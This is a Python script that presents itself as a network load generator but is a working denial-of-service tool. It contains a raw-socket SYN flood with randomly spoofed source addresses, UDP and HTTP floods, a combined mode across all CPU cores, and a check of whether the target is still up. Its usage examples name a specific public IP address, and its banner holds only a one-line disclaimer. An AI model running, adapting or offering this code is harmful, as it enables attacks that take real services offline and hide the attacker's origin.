#!/usr/bin/env python3
"""stress — high-throughput network load generator."""

import sys, time, socket, struct, os, random, multiprocessing
from datetime import datetime

BANNER = """
  stress v3 — high-throughput load test
  only hit systems you own.
"""


def now():
    return datetime.now().strftime("%H:%M:%S")


# ---------- helpers ----------
def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    return ~s & 0xFFFF


def build_syn(target_ip, src_ip=None, src_port=None, seq=None):
    """Build a raw IP+TCP SYN packet as bytes. Fast — no objects."""
    ip = target_ip.split(".")
    daddr = bytes(int(x) for x in ip)
    saddr = bytes(
        int(x)
        for x in (
            src_ip
            or f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        ).split(".")
    )

    sport = src_port or random.randint(1024, 65535)
    dport = random.choice([80, 443, 8080, 22, 53, 8443, 3389])
    seq_n = seq or random.randint(0, 0xFFFFFFFF)

    # IP header (20 bytes)
    ver_ihl = 0x45
    tos = 0
    total_len = 40  # 20 IP + 20 TCP
    ip_id = random.randint(0, 0xFFFF)
    flags_off = 0x4000  # Don't fragment
    ttl = 64
    proto = 6  # TCP
    ip_hdr = struct.pack(
        "!BBHHHBBH", ver_ihl, tos, total_len, ip_id, flags_off, ttl, proto, 0
    )
    ip_hdr += saddr + daddr
    ip_checksum = checksum(ip_hdr)
    ip_hdr = struct.pack(
        "!BBHHHBBH", ver_ihl, tos, total_len, ip_id, flags_off, ttl, proto, ip_checksum
    )
    ip_hdr += saddr + daddr

    # TCP header (20 bytes)
    data_off = 0x50
    flags = 0x02  # SYN
    window = 65535
    tcp_hdr = struct.pack(
        "!HHIIBBHHH", sport, dport, seq_n, 0, data_off, flags, window, 0, 0
    )
    # pseudo header for checksum
    psh = struct.pack("!4s4sBBH", saddr, daddr, 0, proto, 20)
    tcp_checksum = checksum(psh + tcp_hdr)
    tcp_hdr = struct.pack(
        "!HHIIBBHHH", sport, dport, seq_n, 0, data_off, flags, window, tcp_checksum, 0
    )

    return ip_hdr + tcp_hdr


# ---------- worker process ----------
def syn_worker(target, dur, worker_id, result_queue):
    """Raw socket SYN flood — no scapy, no objects, just bytes."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        result_queue.put(("error", "need root"))
        return

    end = time.time() + dur
    count = 0
    last_report = time.time()

    while time.time() < end:
        pkt = build_syn(target)
        try:
            sock.sendto(pkt, (target, 0))
            count += 1
        except:
            pass

        # report every 2 seconds
        now_t = time.time()
        if now_t - last_report >= 2:
            result_queue.put(("progress", worker_id, count))
            last_report = now_t

    result_queue.put(("done", worker_id, count))
    sock.close()


# ---------- orchestrator ----------
def syn_flood(target, dur, workers=0):
    """SYN flood using N parallel processes on all cores."""
    if workers == 0:
        workers = os.cpu_count() or 4

    print(f"  launching {workers} workers on {target} for {dur}s\n")

    queue = multiprocessing.Queue()
    procs = []

    for i in range(workers):
        p = multiprocessing.Process(target=syn_worker, args=(target, dur, i, queue))
        p.start()
        procs.append(p)

    # monitor
    start = time.time()
    totals = [0] * workers
    last_total = 0
    last_report_t = time.time()
    reports = 0

    while any(p.is_alive() for p in procs):
        try:
            msg = queue.get(timeout=0.5)
            if msg[0] == "progress":
                _, wid, c = msg
                totals[wid] = c
            elif msg[0] == "done":
                _, wid, c = msg
                totals[wid] = c
            elif msg[0] == "error":
                print(f"  {msg[1]}")
        except:
            pass

        # print rate every second
        elapsed = time.time() - start
        if elapsed > 0 and time.time() - last_report_t >= 1:
            total = sum(totals)
            rate = (total - last_total) / (time.time() - last_report_t)
            print(f"  {now()}  {total:>8} pkts  {rate:>6.0f}/s", end="\r")
            last_total = total
            last_report_t = time.time()
            reports += 1

    for p in procs:
        p.join()

    total = sum(totals)
    elapsed = time.time() - start
    print(
        f"\n  {now()}  done — {total} packets in {elapsed:.1f}s ({total / elapsed:.0f}/s)"
    )


# ---------- UDP flood (fast version) ----------
def udp_worker(target, dur, worker_id, result_queue):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        result_queue.put(("error", "socket failed"))
        return

    end = time.time() + dur
    count = 0
    payloads = [os.urandom(s) for s in [64, 256, 512, 1024, 1400]]
    ports = [53, 80, 123, 161, 443, 5000, 8080]
    last_report = time.time()

    while time.time() < end:
        try:
            sock.sendto(random.choice(payloads), (target, random.choice(ports)))
            count += 1
        except:
            pass
        if time.time() - last_report >= 2:
            result_queue.put(("progress", worker_id, count))
            last_report = time.time()

    result_queue.put(("done", worker_id, count))
    sock.close()


def udp_flood(target, dur, workers=0):
    if workers == 0:
        workers = max(2, os.cpu_count() // 2)

    print(f"  launching {workers} udp workers on {target} for {dur}s\n")
    queue = multiprocessing.Queue()
    procs = []

    for i in range(workers):
        p = multiprocessing.Process(target=udp_worker, args=(target, dur, i, queue))
        p.start()
        procs.append(p)

    start = time.time()
    totals = [0] * workers
    last_total = 0
    last_report_t = time.time()

    while any(p.is_alive() for p in procs):
        try:
            msg = queue.get(timeout=0.5)
            if msg[0] in ("progress", "done"):
                totals[msg[1]] = msg[2]
        except:
            pass

        if time.time() - last_report_t >= 1:
            total = sum(totals)
            rate = (total - last_total) / (time.time() - last_report_t)
            print(f"  {now()}  {total:>8} pkts  {rate:>6.0f}/s", end="\r")
            last_total = total
            last_report_t = time.time()

    for p in procs:
        p.join()

    total = sum(totals)
    elapsed = time.time() - start
    print(
        f"\n  {now()}  done — {total} packets in {elapsed:.1f}s ({total / elapsed:.0f}/s)"
    )


# ---------- HTTP flood (fast) ----------
def http_worker(target, dur, worker_id, result_queue):
    end = time.time() + dur
    count = 0
    req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n".encode()
    last_report = time.time()

    while time.time() < end:
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, 80))
            s.send(req)
            s.recv(256)
            s.close()
            count += 1
        except:
            pass
        if time.time() - last_report >= 2:
            result_queue.put(("progress", worker_id, count))
            last_report = time.time()

    result_queue.put(("done", worker_id, count))


def http_flood(target, dur, workers=0):
    if workers == 0:
        workers = max(4, os.cpu_count() * 2)

    print(f"  launching {workers} http workers on {target} for {dur}s\n")
    queue = multiprocessing.Queue()
    procs = []

    for i in range(workers):
        p = multiprocessing.Process(target=http_worker, args=(target, dur, i, queue))
        p.start()
        procs.append(p)

    start = time.time()
    totals = [0] * workers
    last_total = 0
    last_report_t = time.time()

    while any(p.is_alive() for p in procs):
        try:
            msg = queue.get(timeout=0.5)
            if msg[0] in ("progress", "done"):
                totals[msg[1]] = msg[2]
        except:
            pass

        if time.time() - last_report_t >= 1:
            total = sum(totals)
            rate = (total - last_total) / (time.time() - last_report_t)
            print(f"  {now()}  {total:>8} req  {rate:>6.0f}/s", end="\r")
            last_total = total
            last_report_t = time.time()

    for p in procs:
        p.join()

    total = sum(totals)
    elapsed = time.time() - start
    print(
        f"\n  {now()}  done — {total} requests in {elapsed:.1f}s ({total / elapsed:.0f}/s)"
    )


# ---------- all at once ----------
def all_at_once(target, dur=30):
    sub_dur = dur
    print(f"  launching syn + udp + http on {target} for {sub_dur}s\n")
    procs = [
        multiprocessing.Process(
            target=syn_flood, args=(target, sub_dur, max(2, os.cpu_count() // 2))
        ),
        multiprocessing.Process(target=udp_flood, args=(target, sub_dur, 2)),
        multiprocessing.Process(target=http_flood, args=(target, sub_dur, 4)),
    ]
    for p in procs:
        p.start()
    for p in procs:
        p.join()


# ---------- verify ----------
def verify(target):
    print(f"  checking {target}...")
    r = os.system(f"ping -c2 -W2 {target} >/dev/null 2>&1")
    alive = r == 0
    print(f"  icmp: {'alive' if alive else 'no response'}")

    for p in [80, 443, 22, 8080, 8443, 53]:
        try:
            s = socket.socket()
            s.settimeout(1.5)
            s.connect((target, p))
            print(f"  port {p}: open")
            s.close()
        except:
            pass


# ---------- main ----------
if __name__ == "__main__":
    print(BANNER)

    if len(sys.argv) < 2:
        print("  usage: python3 stress.py <target> <method> [duration] [workers]")
        print("  methods: syn, http, udp, all, verify")
        print("  examples:")
        print("    python3 stress.py 2.121.59.67 syn 30")
        print("    python3 stress.py example.com http 60")
        print("    python3 stress.py 192.168.0.1 all 20")
        print("    python3 stress.py 2.121.59.67 verify")
        sys.exit(1)

    target = sys.argv[1]
    method = sys.argv[2].lower() if len(sys.argv) > 2 else "verify"
    dur = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 30
    workers = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].isdigit() else 0

    print(f"  target:   {target}")
    print(f"  method:   {method}")
    if method != "verify":
        print(f"  duration: {dur}s")
        print(f"  workers:  {workers if workers else 'auto (all cores)'}")
    print()

    methods = {
        "syn": lambda: syn_flood(target, dur, workers),
        "http": lambda: http_flood(target, dur, workers),
        "udp": lambda: udp_flood(target, dur, workers),
        "all": lambda: all_at_once(target, dur),
        "verify": lambda: verify(target),
    }

    fn = methods.get(method)
    if not fn:
        print(f"  unknown: {method}")
        sys.exit(1)

    fn()
    print()
